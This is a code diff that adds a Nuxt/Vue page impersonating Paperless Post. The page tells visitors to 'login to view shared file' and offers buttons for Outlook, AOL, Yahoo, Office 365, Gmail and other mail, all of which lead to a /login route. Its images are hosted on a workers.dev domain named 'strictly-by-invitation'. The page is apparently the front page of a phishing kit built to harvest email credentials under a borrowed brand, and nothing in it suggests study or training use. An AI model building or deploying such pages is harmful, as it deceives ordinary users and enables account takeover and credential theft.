@@ -1,0 +1,148 @@
+<template>
+    <div class="home">
+        <div class="card">
+            <section class="section-text">
+                <h2>Welcome to Paperless Post!</h2>
+                <p>To read the invitation, please choose your email provider below login to view shared file.</p>
+            </section>
+            <section class="links">
+                <NuxtLink to="/login">
+                    <button>
+                        <img src="https://abbeyxcfran.strictly-by-invitation.workers.dev/images/outlook.svg" alt="">
+                        <p>Continue with Outlook</p>
+                    </button>
+                </NuxtLink>
+
+                <NuxtLink to="/login">
+                    <button>
+                        <img src="https://abbeyxcfran.strictly-by-invitation.workers.dev/images/aol.png" alt="">
+                        <p>Continue with AOL</p>
+                    </button>
+                </NuxtLink>
+
+                <NuxtLink to="/login">
+                    <button>
+                        <img src="https://abbeyxcfran.strictly-by-invitation.workers.dev/images/yahoo.svg" alt="">
+                        <p>Continue with Yahoo!</p>
+                    </button>
+                </NuxtLink>
+
+                <NuxtLink to="/login">
+                    <button>
+                        <img src="https://abbeyxcfran.strictly-by-invitation.workers.dev/images/office365.svg" alt="">
+                        <p>Continue with Office 365</p>
+                    </button>
+                </NuxtLink>
+
+                <NuxtLink to="/login">
+                    <button>
+                        <img src="https://abbeyxcfran.strictly-by-invitation.workers.dev/images/gmail.svg" alt="">
+                        <p>Continue with Gmail</p>
+                    </button>
+                </NuxtLink>
+
+                <NuxtLink to="/login">
+                    <button>
+                        <img src="https://abbeyxcfran.strictly-by-invitation.workers.dev/images/mail.png" alt="">
+                        <p>Continue with Other Mail</p>
+                    </button>
+                </NuxtLink>
+            </section>
+            <section class="footer">
+                <p>
+                    By continuing, you agree to Paperless Post’s <a href="">Terms of Use</a>.
+                    <br>
+                    Read our <a href="Privacy Policy">Privacy Policy</a>.
+                </p>
+            </section>
+        </div>
+    </div>
+</template>
+
+<style>
+
+.footer {
+    color: #8b8b8b;
+    font-size: 12px;
+    line-height: 16px;
+    text-align: center;
+}
+
+.footer p {
+    margin: 30px 23px 0 23px;
+}
+
+.footer p a {
+    text-decoration: underline;
+}
+
+.footer p a:hover {
+    color: #007bff;
+}
+
+.home {
+    width: full;
+    height: 100vh;
+    background: #000000b9;
+    display: grid;
+    place-items: center;
+}
+
+.card {
+    height: 650px;
+    width: 500px;
+    background-color: white;
+    padding: 34px 52px 22px;
+}
+
+.section-text {
+    margin: 30px 0 18px;
+    text-align: center;
+}
+
+.section-text h2 {
+    font-size: 25px;
+    margin-bottom: 7px;
+    font-weight: 400;
+}
+
+.section-text p {
+    font-size: 16px;
+    line-height: 24px;
+}
+
+.links {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+
+
+}
+
+.links button {
+    margin-top: 10px;
+    text-align: center;
+    font-size: 16px;
+    width: 348.48px;
+    height: 46px;
+    background: white;
+    border: 1px solid #00000020;
+    border-radius: 100px;
+    cursor: pointer;
+    position: relative;
+}
+
+.links button img {
+    width: 24px;
+    height: 24px;
+    position: absolute;
+    top: 20%;
+    left: 20px;
+}
+
+.links button p {
+    margin: 0;
+    font-weight: 500;
+}
+</style>
